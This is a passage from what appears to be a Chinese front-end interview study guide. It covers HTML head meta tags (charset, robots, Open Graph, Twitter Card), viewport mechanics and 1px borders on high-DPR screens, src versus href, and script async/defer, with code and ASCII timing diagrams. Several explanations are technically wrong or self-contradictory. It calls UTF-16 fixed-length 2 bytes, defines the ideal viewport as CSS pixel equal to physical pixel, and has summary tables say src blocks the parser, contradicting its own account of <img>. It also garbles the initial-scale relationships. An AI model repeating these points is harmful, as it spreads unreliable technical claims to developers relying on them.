**为什么必须放在 `<head>` 最前面（前 1024 字节）？**
- 浏览器以此编码来解析**整个文档**，包括 `<title>` 和其他 meta
- 若放在 `<title>` 之后，浏览器会用默认编码（Latin-1）先解析一遍，发现 charset 后再回退重解析——导致乱码或重复解析
- 浏览器在解析前 1024 字节时就必须知道编码，所以 `<meta charset>` 必须在最前面

**UTF-8 vs UTF-16：**
- UTF-8：变长编码（1~4 字节），ASCII 兼容，网络传输体积小，**Web 默认**
- UTF-16：定长 2 字节，中文效率高，但 ASCII 文件体积翻倍，且网络传输时字节序（Endianness）问题复杂——**仅在有大量 CJK 字符的专业场景使用**

#### 3.3 视口设置（viewport）— 详见 1.4 节

viewport 标签是移动端适配的基石，详见 **1.4 viewport 原理**。

#### 3.4 robots 爬虫指令

```html
<meta name="robots" content="index, follow">
```

| 值 | 含义 |
|---|---|
| `index` | 允许索引（默认） |
| `noindex` | 禁止索引 |
| `follow` | 跟踪链接（默认） |
| `nofollow` | 不跟踪链接 |
| `none` | 等价于 `noindex, nofollow` |
| `noarchive` | 不缓存快照 |
| `nosnippet` | SERP 不显示描述片段 |

**与 HTTP Equiv 的关系：**
- `<meta name="robots">` 是页面级别的控制
- `X-Robots-Tag` HTTP header 是**请求级别**的控制，优先级更高（用于 PDF、图片等非 HTML 资源）
- `robots.txt` 的 `Disallow` 是爬虫**主动遵守的规则**，技术上无法强制（恶意爬虫不遵守）

#### 3.5 Open Graph（OG）标签

Open Graph Protocol 由 Facebook 2010 年发布，已被微信、Twitter、LinkedIn 等几乎所有主流社交平台采用。

```html
<meta property="og:title" content="前端面试八股文完整题库">
<meta property="og:type" content="website">         <!-- website/article/product -->
<meta property="og:description" content="覆盖12大模块的海量真题详解">
<meta property="og:image" content="https://example.com/og-image.jpg">
<meta property="og:url" content="https://example.com/article">
<meta property="og:site_name" content="前端面试网">
```

**og:image 最佳规格（必须满足，否则被裁剪或降级）：**
| 参数 | 要求 |
|------|------|
| 最小尺寸 | 600×315 px |
| 推荐尺寸 | 1200×630 px |
| 长宽比 | 固定 1.91:1（否则自动裁剪） |
| 文件大小 | ≤ 5MB |
| 格式 | JPG/PNG/WebP，**避免 GIF**（静态平台不支持） |

**og:url 与 canonical 的关系：**
- `og:url` 声明该内容在社交平台上的"规范 URL"
- 社交平台爬虫会参考 `og:url` 作为分享链接的规范化地址
- 建议与 `<link rel="canonical">` **保持一致**，避免重复内容问题

**Twitter Card 扩展：**
```html
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="前端面试八股文">
<meta name="twitter:description" content="最全面的前端面试题库">
<meta name="twitter:image" content="https://example.com/twitter-image.jpg">
```
> ⚠️ Twitter 在 2024 年后对未声明 `twitter:card` 的页面默认降级为 `summary`（小图），建议显式声明。

#### 3.6 其他常用 meta

```html
<!-- 渲染模式（仅针对旧 IE，Modern IE 已不需此标签） -->
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<!-- 现代浏览器中此标签被忽略，安全无害但属冗余 -->

<!-- 页面刷新/跳转（⚠️ SEO 不友好，仅用于特殊引导页） -->
<meta http-equiv="refresh" content="5;url=https://example.com">
<!-- 5 秒后跳转到目标 URL -->

<!-- 禁止 iOS 自动识别电话/邮箱/地址 -->
<meta name="format-detection" content="telephone=no, email=no, address=no">

<!-- Android 状态栏颜色（配合 manifest.json 使用） -->
<meta name="theme-color" content="#4A90E2">

<!-- iOS 剪切屏颜色（启动图加载前显示的背景色） -->
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

<!-- Windows 磁贴（Windows 8/10 开始屏幕） -->
<meta name="msapplication-TileColor" content="#4A90E2">
<meta name="msapplication-TileImage" content="/tile.png">
```

#### 3.7 生产级完整 head 模板

```html
<head>
  <!-- ① 字符编码必须第一 -->
  <meta charset="UTF-8">

  <!-- ② DNS 预解析（第三方域名） -->
  <link rel="dns-prefetch" href="//fonts.googleapis.com">

  <!-- ③ 预连接关键域名（TCP + TLS 握手） -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

  <!-- ④ 预加载当前页面关键资源 -->
  <link rel="preload" href="/fonts/main.woff2" as="font" crossorigin type="font/woff2">
  <link rel="preload" href="/hero.webp" as="image">

  <!-- ⑤ title + description（SEO 最基础） -->
  <title>前端面试八股文 | 覆盖12大模块</title>
  <meta name="description" content="最全面的前端面试八股文，覆盖HTML/CSS/JavaScript等12大模块，2026年最新版">

  <!-- ⑥ viewport 必须 -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- ⑦ 爬虫指令 + 规范化 -->
  <meta name="robots" content="index, follow">
  <link rel="canonical" href="https://example.com/article">

  <!-- ⑧ Open Graph -->
  <meta property="og:title" content="前端面试八股文">
  <meta property="og:description" content="最全面的前端面试题库">
  <meta property="og:image" content="https://example.com/og-image.jpg">
  <meta property="og:url" content="https://example.com/article">
  <meta property="og:type" content="article">
  <meta property="og:site_name" content="前端面试网">

  <!-- ⑨ Twitter Card -->
  <meta name="twitter:card" content="summary_large_image">

  <!-- ⑩ Favicon -->
  <link rel="icon" href="/favicon.svg" type="image/svg+xml">

  <!-- ⑪ Critical CSS 内联（首屏必须） -->
  <style>body{margin:0;font-family:system-ui}</style>
</head>
```

#### 3.8 高频面试追问

**Q1：如果把 `<meta charset>` 放在 `<title>` 之后，会发生什么？**
> 浏览器在解析 HTML 时，遇到 `<meta charset>` 之前的部分会**先用默认编码（通常是 Latin-1/ISO-8859-1）解析一遍**，发现 charset 后才回退并用正确编码重新解析。这会导致：
> 1. **两次解析**（性能浪费）
> 2. 在某些浏览器中，如果 `<title>` 中包含非 ASCII 字符（如中文），在第一次 Latin-1 解析时会变成乱码，即使最终正确解析也无法消除已产生的 BOM 问题
> 3. 极少数情况下，如果 `<meta charset>` 不在文档前 1024 字节内，浏览器直接使用默认编码，整个页面乱码

**Q2：`<meta http-equiv="X-UA-Compatible" content="IE=edge">` 在现代浏览器中还有用吗？**
> 现代 IE（Edge Chromium）已不再识别此标签。此标签的用途是让旧版 IE（IE6-IE9）使用最新渲染引擎，避免 IE7/8 默认的 Quirks Mode。
> **现状**：IE 已于 2022 年正式退役（微软 2023 停止支持），此 meta 标签在 2026 年已是**冗余无害但无意义**的存在，建议从模板中移除。

> 📚 参考：
> - [MDN — meta charset](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta#attr-charset)
> - [Open Graph Protocol](https://ogp.me/)
> - [Google — Robots meta tag](https://developers.google.com/search/docs/crawling-indexing/robots-meta-tag)
> - [MDN — HTML head](https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/The_head_metadata_in_HTML)

---

### 4. viewport 原理

#### 4.1 定义与核心原理

**viewport（视口）** 是浏览器用于布局渲染的可见区域。在桌面端，viewport 就是浏览器窗口大小；但在移动端，由于屏幕物理尺寸远小于传统桌面显示器，需要引入虚拟视口机制。

**三个 viewport 体系（PPK，2011）：**

```
┌─────────────────────────────────────────────────────────┐
│              Layout Viewport（布局视口）                   │
│  CSS 布局参照的虚拟画布，默认 980px（各浏览器不同）        │
│  ┌─────────────────────────────────────────────────┐   │
│  │           Visual Viewport（视觉视口）              │   │
│  │  用户在屏幕上实际看到的区域，受缩放操作影响          │   │
│  │  ┌─────────────────────────────────────────┐    │   │
│  │  │        Ideal Viewport（理想视口）         │    │   │
│  │  │  CSS 像素 = 物理像素 的宽度，即 device-width │    │   │
│  │  └─────────────────────────────────────────┘    │   │
│  └─────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────┘
```

| 视口类型 | 说明 | 获取方式 | 决定因素 |
|---------|------|---------|---------|
| **Layout Viewport** | CSS 布局参照的虚拟画布 | `document.documentElement.clientWidth` | 浏览器默认（移动端约 980px） |
| **Visual Viewport** | 用户在屏幕上实际看到的区域 | `window.innerWidth` | 用户缩放操作 |
| **Ideal Viewport** | 设备最佳显示宽度 | 等于 CSS 像素 1:1 物理像素的宽度 | 设备物理分辨率 |

#### 4.2 产生背景：为什么移动端需要 viewport

**桌面网页入侵移动端（2007 年 iPhone）：**
- 早期智能手机 Safari 将桌面网页缩放为 980px 宽的"虚拟画布"
- 用户看到的是一个微缩的整页，必须双击或缩放才能阅读
- Apple 引入了 `<meta name="viewport">` 解决此问题

**DPR 的出现（iPhone 4，2010）：**
- Retina 屏幕：DPR=2（1 CSS px = 2×2 物理像素）
- 导致 `border: 1px` 在 Retina 屏上渲染为 2px 物理像素，边框视觉上偏粗

#### 4.3 运行机制：visual viewport 与 layout viewport 的关系

**缩放时两者如何联动：**

```
缩放比例 = Visual Viewport CSS 像素宽度 / Layout Viewport CSS 像素宽度

initial-scale=1.0  →  Visual = Layout = device-width（Ideal Viewport）
initial-scale=2.0  →  Visual = Layout / 2（页面缩小 2 倍，内容更精细）
initial-scale=0.5  →  Visual = Layout × 2（页面放大，内容更粗糙）
```

**JS 视口监听（ResizeObserver + Visual Viewport API）：**
```javascript
// 监听 layout viewport 变化（窗口大小改变）
window.addEventListener('resize', () => {
  console.log('Layout VP:', document.documentElement.clientWidth);
});

// 监听 visual viewport 变化（用户缩放/滚动/虚拟键盘弹出）
// VisualViewport API（Chrome 61+，iOS Safari 13.4+）
if (window.visualViewport) {
  const vv = window.visualViewport;
  vv.addEventListener('resize', () => {
    console.log('Visual VP width:', vv.width);
    console.log('Scale:', vv.scale);
    // 虚拟键盘弹出时：vv.height < window.innerHeight
    document.body.style.setProperty('--vh', `${vv.height * 0.01}px`);
  });
  vv.addEventListener('scroll', () => {
    console.log('Visual VP offset:', vv.offsetLeft, vv.offsetTop);
  });
}
```

#### 4.4 CSS 像素 vs 物理像素 vs DPR

```
物理像素（Device Pixel）= 屏幕实际发光的硬件点，出厂固定
CSS 像素（CSS Pixel）    = Web 编程中的抽象单位
DPR（devicePixelRatio）  = 物理像素 / CSS 像素
```

| 设备 | DPR | CSS 1px 对应 |
|------|-----|-------------|
| 普通 Android | 1.0 | 1×1 物理像素 |
| iPhone 6/7/8/X | 2.0 | 2×2 物理像素 |
| iPhone Plus / 三星旗舰 | 3.0 | 3×3 物理像素 |
| iPad Pro | 2.0+ | 2×2 物理像素 |

#### 4.5 DPR=2 屏幕 1px 边框过粗：五种解法

**问题本质：** `border: 1px` 在 DPR=2 设备上 = 2×2 物理像素 = 视觉 2px

| 方案 | 原理 | 优点 | 缺点 |
|------|------|------|------|
| **① scaleY(0.5) 伪元素** | 将伪元素的 1px 缩小到 0.5 CSS px | 通用性好 | 需额外 DOM |
| **② 直接写 0.5px** | 部分浏览器支持 | 最简洁 | iOS <13/Android 旧版不支持 |
| **③ box-shadow 模拟** | 用 0.5px 阴影替代边框 | 无额外 DOM | 颜色控制不灵活 |
| **④ 媒体查询** | DPR=2 时用 1px，DPR=3 时用 0.33px | 精准 | 维护成本高 |
| **⑤ SVG border-image** | 矢量 SVG 线 | 清晰 | 过于复杂 |

**推荐方案（伪元素 + transform）：**
```css
/* 方案①：推荐，兼容所有现代设备 */
.scale-1px {
  position: relative;
  border: none;
}
.scale-1px::after {
  content: '';
  position: absolute;
  left: 0;
  bottom: 0;
  width: 100%;
  height: 1px;
  background: #d1d5db;
  transform: scaleY(0.5);       /* DPR=2 时视觉 1px */
  transform-origin: 0 0;          /* 从左下角缩放 */
}

/* 多方向边框（上下左右） */
.all-borders::before,
.all-borders::after {
  content: '';
  position: absolute;
  background: #d1d5db;
}
.all-borders::before { /* 上边框 */
  top: 0; left: 0; right: 0; height: 1px;
  transform: scaleY(0.5);
}
.all-borders::after { /* 下边框 */
  bottom: 0; left: 0; right: 0; height: 1px;
  transform: scaleY(0.5);
}
```

**方案②（直接 0.5px）：**
```css
/* iOS Safari 13+ / Android Chrome 107+ 支持 */
.border-half {
  border-bottom: 0.5px solid #d1d5db;
}
```

#### 4.6 常见 viewport 问题与避坑

```html
<!-- ❌ 未设置 viewport：移动端页面缩放成"微缩桌面" -->
<!-- 浏览器用 980px layout viewport，内容极小 -->

<!-- ❌ width=320 固定值：宽屏设备（390px+）上页面被截断 -->
<meta name="viewport" content="width=320">

<!-- ❌ user-scalable=no：禁止缩放（影响无障碍，违反 WCAG） -->
<meta name="viewport" content="user-scalable=no">
<!-- WCAG 2.1 Success Criterion 1.4.4 要求允许文本缩放至 200% -->

<!-- ✅ 正确写法 -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```

**virtual keyboard 导致的视口变化（移动端表单常见）：**
```javascript
// 虚拟键盘弹出时，visual viewport 高度 < layout viewport 高度
// 但 window.innerHeight 不变，document.documentElement.clientHeight 也不变
// 只有 window.visualViewport.height 会变小

// 解决方案：CSS 引入 custom property，结合 JS 动态更新
:root {
  --vh: 1vh; /* JS 会动态更新这个值 */
}
.card { height: calc(var(--vh, 1vh) * 50); }
```
```javascript
// JS 中监听虚拟键盘弹出
window.visualViewport?.addEventListener('resize', () => {
  document.documentElement.style.setProperty(
    '--vh',
    `${window.visualViewport.height * 0.01}px`
  );
});
```

#### 4.7 高频面试追问

**Q1：为什么不写 viewport meta 标签，移动端页面会缩得很小？**
> 移动浏览器默认将 layout viewport 设为 980px，而移动端屏幕只有 375-428px CSS 像素宽。浏览器必须将 980px 的内容缩放到 ~375px 的屏幕中——相当于把一个页面缩小到原来的 ~38%，导致内容极小难以阅读。
> 加上 `width=device-width` 后，layout viewport 等于设备宽度（Ideal Viewport），无需缩放。

**Q2：`window.innerWidth` 和 `document.documentElement.clientWidth` 在用户缩放后，哪个值会变？**
> `document.documentElement.clientWidth` = **Layout Viewport 宽度** → **不变**（缩放不改变 layout viewport）
> `window.innerWidth` = **Visual Viewport 宽度** → **变小**（缩放时 Visual Viewport 包含的内容变少）
> 这两个值在**窗口大小改变**时都会变，但缩放只影响 `window.innerWidth`。

**Q3：双击缩放（double-tap zoom）后，Layout Viewport 会改变吗？**
> 双击缩放改变的是 **Visual Viewport 缩放比例**，`window.innerWidth` 会变小，但 `document.documentElement.clientWidth`（Layout Viewport）**不变**。
> 布局仍然基于 Layout Viewport，所以双击缩放不会改变 CSS 布局，只是视觉上放大了。

> 📚 参考：
> - [PPK — A tale of two viewports](https://www.quirksmode.org/mobile/viewports.html)
> - [MDN — viewport meta tag](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Guides/Viewport_meta_element)
> - [MDN — Visual Viewport API](https://developer.mozilla.org/en-US/docs/Web/API/Visual_Viewport)
> - [CSS Values and Units — CSS pixel](https://developer.mozilla.org/en-US/docs/Glossary/CSS_pixel)

---

### 5. src vs href 区别

## 5.1 基本定义

### src (Source)

`src` 是 **source** 的缩写，意为"来源"。它告诉浏览器**替换当前元素的内容**——浏览器必须下载并解析该资源才能呈现该元素。

- **会阻塞渲染**（render-blocking）
- 下载和解析是**同步**的，浏览器必须等待资源就绪才能继续
- 用于替换型元素：`<img>`、`<script>`、`<iframe>`、`<video>`、`<audio>`、`<input type="image">`

### href (Hypertext Reference)

`href` 是 **Hypertext Reference** 的缩写，意为"超文本引用"。它用于**建立当前文档与引用资源之间的关联关系**，但不替换任何元素内容。

- **不会阻塞渲染**（non-render-blocking）
- 浏览器可以**并行下载**资源，同时继续解析 HTML
- 用于链接型元素：`<link>`、`<a>`、`<area>`

---

## 5.2 浏览器行为对比 ASCII 图

```
[无 src/href 属性时的 HTML 解析过程]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  HTML Parse    ████████████░░░░░░░░░░░░░░░░░░░░
               ├──────────┬──────────────────────┤
               0ms        100ms                   200ms


[有 href 属性的 <link>（如 CSS）]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  HTML Parse    ████████████████████████████████  ← 不阻塞，持续进行
               ├───────────────────────────────┤
               0ms                              300ms

  Link Fetch   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                ← 并行下载，不阻塞解析


[有 src 属性的 <script>（无 async/defer）]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  HTML Parse    ████░░░░░░░░░░░░░░░░░░░░░░░░░░░
               ├──────┬──────────────────────────┤
               0ms   50ms                        200ms
                      ▼
               遇到 <script src> → 暂停解析 → 下载JS → 执行JS → 恢复解析
                      ◄──── 阻塞点 ────►


[有 src 属性的 <img>]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  HTML Parse    ██████████████████████████████████████████████
               ├─────────────────────────────────────────────┤
               0ms                                              300ms

  Img Fetch              ▓▓▓▓▓▓▓▓▓▓▓▓  ← 图片下载与解析并行
                         [img 在下载期间不阻塞解析，但渲染时需要等待]
```

**核心差异**：`href` 告诉浏览器"这份资源与你有关联，去提前获取"，浏览器会并行处理；`src` 告诉浏览器"这份资源是这个元素的内容，你必须等它就绪才能继续"。

---

## 5.3 典型场景对比

### 5.3.1 img src — 图片加载（可延迟渲染）

```html
<!-- src: 浏览器必须获取图片才能渲染该 <img> 元素 -->
<img src="avatar.png" alt="User Avatar" />

<!-- 图片加载期间，HTML 解析继续（不阻塞解析器）， -->
<!-- 但图片位置会留下一个空白占位区域。 -->
```

**行为**：
- 下载与 HTML 解析并行
- 渲染树（Render Tree）构建时，`img` 需要图片数据才能绘制 → **渲染被阻塞**
- 图片下载完成后触发重绘（repaint）

### 5.3.2 link href — 样式表链接（非阻塞）

```html
<!-- href: 建立文档与 CSS 的关系，不替换任何内容 -->
<link rel="stylesheet" href="styles.css" />

<!-- 浏览器行为： -->
<!-- 1. 发现 href，识别为 CSS 资源 -->
<!-- 2. 发起并行下载，不停顿地继续解析 HTML -->
<!-- 3. CSS 下载完成后，应用样式 -->
```

**行为**：
- **下载**与解析并行
- CSSOM（CSS Object Model）构建期间，**渲染被阻塞**（因为 CSS 是渲染阻塞资源）
- 但 HTML 解析器本身**不被阻塞**，可以继续构建 DOM

### 5.3.3 script src — 脚本加载（阻塞解析）

```html
<!-- 无属性: 同步加载+执行，完全阻塞解析 -->
<script src="app.js"></script>

<!-- 阻塞过程： HTML parser ──► 遇到 script ──► 暂停 ──►
               下载 JS ──► 执行 JS ──► 恢复 HTML 解析 -->
```

**关键区别**：即使 `<link>` 和 `<script src>` 都会在下载期间引发资源请求，`link` 的下载**不暂停解析器**，而 `script src` **会暂停解析器**。

---

## 5.4 边缘场景

### 5.4.1 link rel="preload" — 提前加载关键资源

```html
<!-- preload 是一种 hint，告诉浏览器提前获取该资源 -->
<!-- 与 href 不同的是：preload 专门用于关键路径资源优化 -->
<link rel="preload" href="critical-font.woff2" as="font" crossorigin="anonymous" />
<link rel="preload" href="main.js" as="script" />

<!-- 对比普通 href： -->
<link rel="stylesheet" href="styles.css" />    <!-- 非关键，不阻塞解析 -->
<link rel="preload" href="critical.css" as="style" /> <!-- 关键，优先级最高 -->
```

| 属性 | 用途 | 阻塞解析器？ | 阻塞渲染？ |
|------|------|-------------|-----------|
| `href`（link） | 建立关联 | 否 | 看资源类型 |
| `src` | 替换内容 | 是（需等资源就绪） | 是（需等资源就绪） |
| `rel="preload"` | 提前获取但不应用 | 否 | 否（只预获取） |

### 5.4.2 link rel="preconnect" — 提前建立 TCP 连接

```html
<!-- preconnect 提前建立网络连接，不获取资源 -->
<link rel="preconnect" href="https://api.example.com" />
<link rel="dns-prefetch" href="https://api.example.com" />

<!-- preconnect 包含 DNS 解析 + TCP handshake + TLS（如果是 HTTPS） -->
<!-- 比 dns-prefetch 更全面，现代浏览器优先使用 preconnect -->
```

**为什么用 preconnect 而不是 preload？** preload 用于资源本体；preconnect 只建立连接，为后续资源请求节省 DNS+TCP 时间。

---

## 5.5 面试追问

### Q1：为什么 CSS 用 link href 而不是 link src？

**答**：CSS 文件不是用来"替换" `<link>` 元素的——`<link>` 是一个空元素，没有可供替换的内容。`href` 的语义是"建立关系"，`rel="stylesheet"` 告诉浏览器这个关系是样式表关联。CSS 的作用是影响已有 DOM 的渲染，而非替换任何元素。

反过来，如果用 `src`，语义就变成"这个 link 元素的内容就是 styles.css"——这在概念上是错误的，因为 link 元素没有内容区可以放样式。

---

### Q2：`<a href="page.html">` 和 `<img src="photo.jpg">` 哪个会阻塞渲染？

**答**：

- `<a href>`：**不阻塞渲染**。它只是声明一个链接关系，浏览器不会预加载目标页面（除非被 `<link rel="prefetch">` 提示）。点击时才导航。
- `<img src>`：**不阻塞 HTML 解析**，但**阻塞渲染**。图片下载完成后，浏览器才能绘制该区域。

本质上，两者都不阻塞 HTML 解析器的继续工作。关键区别在于渲染：CSS 是渲染阻塞资源（必须等所有 CSS 下载和应用后才能绘制），图片下载完成后才绘制（异步）。

---

### Q3：什么情况下 `href` 也会阻塞页面？

**答**：当 href 指向的资源是**渲染阻塞型资源**时，会间接导致渲染阻塞。最典型的情况是 CSS：

1. `<link rel="stylesheet" href="main.css">` 被解析
2. HTML 解析器继续工作，DOM 在增长
3. CSS 文件下载完成，CSSOM 构建
4. DOM + CSSOM 合并为 Render Tree
5. **在 CSSOM 完成之前，渲染被阻塞**（不会先绘制没有完整样式的页面，避免 FOUC）

所以 `href` 本身不阻塞解析器，但如果它关联的是 CSS，就会阻塞**渲染**。

---

## 5.6 总结对比表

| 维度 | `src` | `href` |
|------|-------|--------|
| 语义 | 内容来源（替换当前元素） | 关系引用（建立关联） |
| 典型元素 | img, script, iframe, video | link, a, area |
| HTML 解析器阻塞？ | 是（同步下载+执行） | 否（并行下载） |
| 渲染阻塞？ | 是（需资源就绪才能渲染元素） | 取决于资源类型（CSS 阻塞，preload 不阻塞） |
| 执行时机 | 立即替换元素内容 | 不直接"执行"，只是建立关系 |
| 能否省略结束标签 | 替换型空元素可以（如 `<img />`） | link 等也为空元素 |

> 📚 参考：
> - https://blog.csdn.net/Bianca427/article/details/125421327
> - https://www.cnblogs.com/gavinzzh-firstday/p/5735010.html
> - https://blog.csdn.net/weixin_42420703/article/details/83213799

---

### 6. script async/defer 区别

# Section 6: script async / defer 的区别

## 6.1 基本概念

默认情况下（无 async/defer），浏览器加载 `<script src="...">` 时：

1. 暂停 HTML 解析器（Parse）
2. 发起网络请求下载 JS
3. 下载完成后**立即执行**（Execute）
4. 恢复 HTML 解析

这称为**同步阻塞式加载**，会显著延迟首屏渲染（FCP, LCP）。

`async` 和 `defer` 是解决这一问题的两个布尔属性（可共存？不，可二选一）。

---

## 6.2 时序图：三种模式的完整对比

```
时间 ──► ─────────────────────────────────────────────────────────►

[1] 无属性 (sync)：
    HTML Parse:  ████████[    PAUSE: 下载 JS      ][恢复]
                              ████████████████
                              └──────┬──────────┘
                                     ▼
                              JS Execute: ████████
                                         ↑ 执行时页面"死机"

    DOMContentLoaded 触发于: JS 执行完毕后 ───────────────────► DCL
    首屏 FCP: 被延迟到 JS 执行完


[2] async 属性：
    HTML Parse:  ████████████████[继续]────────────────────────
                                     ████████████  ← JS 下载并行
                              └───┬──┘
                                  ▼
                              执行: ████         ← 下载完即执行
                                        ↑
                                    可能发生在解析完成前或后
                                    （顺序不确定！）

    DOMContentLoaded: 在 async 脚本执行后触发（不保证顺序）
    ⚠️ DOM 可能尚未完全构建，访问 DOM 需谨慎


[3] defer 属性：
    HTML Parse:  ██████████████████████████████████████
    （完整解析 HTML，不中断）────────────────────────────►
                                               ↓
                                    JS 下载（并行）: ████████████
                                               ↓
                              执行: ████████  ← DCL 之前，按顺序执行

    DOMContentLoaded 触发于: 所有 defer 脚本执行完毕之后
    保证顺序，保证 DOM 已就绪
```

### 关键时间点标记

```
                         DCL (DOMContentLoaded)
                              │
HTML ──┬──► parse ───► complete ──────────────────────►
        │                  │                          │
     遇到script         遇到async              defer执行窗口
        │                  │                     ↓ DCL
     同步下载+执行       下载完即执行
     (阻塞解析)          (不阻塞解析)
```

---

## 6.3 渲染阻塞（Render-Blocking）详解

### 默认（sync）脚本的渲染阻塞链

```
HTML Parser  ──► 遇到 <script src>  ──► PAUSE
                                             │
                    ┌─────────────────────────┤
                    ▼                         ▼
               网络下载 JS              下载期间：
               （可能 100-500ms+）       页面无响应，无法渲染
                    │
                    ▼
               执行 JS（可能修改 DOM/CSSOM）
                    │
                    ▼
              恢复 HTML 解析  ──► 渲染树  ──► 首屏绘制
```

### async 的渲染阻塞

```
HTML Parser  ──► 遇到 <script async>  ──► 继续解析（不 PAUSE）
                                             │
                                    JS 下载与解析并行
                                             │
                              JS 下载完成 ──► PAUSE（执行）
                                             │
                                        可能阻塞解析（取决于到达时间）
                                             │
                                        执行完继续解析或渲染
```

**async 的陷阱**：如果 JS 在解析完成前下载完毕，会再次暂停解析器来执行脚本，这仍是渲染阻塞。async 只保证"不等待下载"，不保证"不阻塞执行"。

### defer 的渲染阻塞

```
HTML Parser  ──► 遇到 <script defer>  ──► 继续解析（完全不阻塞）
                                             │
                                    JS 下载与解析并行
                                    解析完毕时：scripts 已下载但未执行
                                             │
                              HTML 解析完成 ──► DOMContentLoaded 之前
                                             │
                                    defer scripts 按顺序执行
                                             │
                                        执行完 → DCL 触发 → 渲染
```

**defer 是最理想的**：`async` 下载期间不阻塞，但**执行时**可能阻塞解析；`defer` 完全不阻塞解析，**执行时 DOM 已就绪**，且按顺序执行。

---

## 6.4 多个脚本的执行顺序

### 无属性（sync）— 按文档顺序，依次下载+执行

```html
<script src="a.js"></script>  <!-- 下载a，执行a，阻塞b的下载 -->
<script src="b.js"></script>  <!-- 等a执行完，才下载b，执行b -->
<script src="c.js"></script>  <!-- 等b执行完，才下载c，执行c -->
<!-- 100 + 200 + 150 = 450ms+ 阻塞 -->
```

### async — 顺序不保证（谁先下载完谁先执行）

```html
<script async src="a.js"></script>  <!-- 下载中，继续解析 -->
<script async src="b.js"></script>  <!-- 下载中，继续解析 -->
<script async src="c.js"></script>  <!-- 下载中，继续解析 -->
<!-- 假设网络顺序: b→c→a，执行顺序: b, c, a -->
<!-- 乱序执行！依赖关系必须避免！ -->
```

### defer — 按文档顺序执行（保证顺序）

```html
<script defer src="a.js"></script>  <!-- 下载并行，执行等待 -->
<script defer src="b.js"></script>  <!-- 下载并行，执行等待 -->
<script defer src="c.js"></script>  <!-- 下载并行，执行等待 -->
<!-- 下载顺序: 任意 → 执行顺序: a → b → c -->
<!-- ✅ 顺序有保证，适合有依赖关系的模块 -->
```

**defer 的执行时机**：所有 defer scripts 在 DOM 解析完成后、DOMContentLoaded 事件触发**之前**，按文档顺序执行。

---

## 6.5 现代打包 vs 原生 ESM 对比

### 传统打包（Bundle）

```html
<!-- 打包后：单个大 JS 文件，defer 全部 -->
<script defer src="bundle.js"></script>

<!-- 等同于：defer 按顺序加载，模拟打包的顺序执行 -->
```

### 原生 ESM（ES Modules）

```html
<!-- ESM 天然 defer 行为（延迟执行） -->
<script type="module" src="app.js"></script>

<!-- 特性对比： -->
<!-- 1. 默认 defer 行为（不阻塞解析） -->
<!-- 2. 自动 strict mode -->
<!-- 3. 模块级别作用域（不会污染全局） -->
<!-- 4. 静态依赖解析，按依赖顺序执行（类似 defer） -->
<!-- 5. CORS 要求（必须 same-origin 或有 CORS header） -->
```

```javascript
// app.js — ES Module 示例
import { helper } from './helper.js';    // 静态解析，按顺序
import { ui } from './ui.js';            // 在 helper.js 之后执行

export function bootstrap() {
  document.getElementById('app');       // DOM 已就绪（defer 语义）
}
```

### 打包 vs 原生 ESM 关键区别

| 特性 | 打包（Bundle + defer） | 原生 ESM |
|------|----------------------|---------|
| 执行顺序 | 按 bundle 入口顺序（defer） | 按 import 依赖顺序 |
| HTTP 请求数 | 1（大文件） | N（每个模块单独请求） |
| 渲染阻塞 | defer（无阻塞） | defer（无阻塞） |
| 缓存粒度 | 整体失效 | 模块级，可精细化缓存 |
| 依赖共享 | 打包后内联 | 按需加载，可能重复请求 |
| 生产环境 | 仍建议合并减少请求 | 可用 import maps / dynamic import |
| 供应商前缀 | 需配置（browserslist） | 自动按浏览器支持 |

---

## 6.6 何时使用哪个

### 使用 `defer` — 最佳默认选择

- 脚本**有顺序依赖**（a.js 依赖 b.js 的导出）
- 脚本需要**访问 DOM**（已保证解析完毕）
- 通用第三方库、分析脚本（不需要立即执行）

```html
<!-- ✅ 推荐：第三方库、框架、工具函数 -->
<script defer src="vendor.bundle.js"></script>
<script defer src="app.js"></script>
```

### 使用 `async` — 独立运行的脚本

- 脚本**完全独立**，不依赖 DOM 也不被其他脚本依赖
- 如：统计脚本、监控脚本、广告脚本、独立的 widget

```html
<!-- ✅ 推荐：独立脚本，不在乎执行时机 -->
<script async src="analytics.js"></script>
<!-- 加载完立即执行，不等 DOM，不保证顺序 -->
```

### 无属性（sync）— 不推荐，但有场景

- 脚本需要**在页面渲染前运行**（如 Modernizr 检测）
- 使用 `document.write()`（虽然这是糟糕的实践）
- 古老的不兼容 async/defer 的第三方标签

```html
<!-- ⚠️ 明确知道需要阻塞渲染的场景才用 -->
<script src="critical-init.js"></script>
<!-- 不推荐：除非有明确理由，否则用 defer -->
```

---

## 6.7 TypeScript / React 示例

### 在 React + Vite 项目中

```html
<!-- vite 生成的 index.html 默认用 defer -->
<!-- 无需手动加 defer，Vite 打包后的 script 自动 defer -->
<script type="module" src="/src/main.tsx"></script>
<!-- 等效于 defer，天然延迟执行 -->
```

### 动态加载（非阻塞）

```typescript
// 场景：用户点击才加载功能模块
// 不阻塞首屏，用户交互后按需加载
async function loadFeature(): Promise<void> {
  // 动态 import 返回一个 promise，模块下载是异步的
  const { FeatureModule } = await import('./features/FeatureModule.ts');

  const container = document.getElementById('feature-root');
  if (container) {
    const instance = new FeatureModule();
    instance.mount(container);
  }
}

// 按需加载，不影响首屏性能
document.getElementById('load-btn')?.addEventListener('click', loadFeature);
```

### 关键脚本预加载（preload + defer 配合）

```html
<!-- 关键 JS 预加载，但不阻塞解析 -->
<link rel="preload" href="main.js" as="script" />
<!-- 后续脚本自然用 defer 或 type="module" -->
